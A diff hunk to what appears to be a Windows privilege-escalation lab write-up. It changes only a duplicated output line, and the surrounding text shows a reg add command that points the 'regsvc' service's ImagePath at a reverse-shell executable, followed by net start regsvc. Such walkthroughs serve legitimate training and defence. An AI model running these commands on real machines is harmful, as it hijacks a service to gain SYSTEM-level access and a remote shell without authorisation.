@@ -419,7 +419,7 @@ We can overwrite the ImagePath registry value to point to a malicious program:
 
 ```cmd
 C:\PrivEsc>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse-shell.exe /f
-reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse-shell.exe /f
+
 The operation completed successfully.
 
 C:\PrivEsc>net start regsvc
